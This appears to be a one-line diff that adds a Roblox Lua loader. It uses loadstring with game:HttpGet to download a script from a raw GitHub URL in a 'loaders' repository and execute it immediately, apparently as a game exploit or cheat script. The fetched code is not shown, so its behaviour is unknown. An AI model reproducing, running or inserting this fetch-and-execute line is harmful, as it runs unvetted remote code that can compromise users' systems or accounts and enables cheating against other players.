@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/cure-violence-district-spam4-98ejkx9cgnyqnj.lua"))()
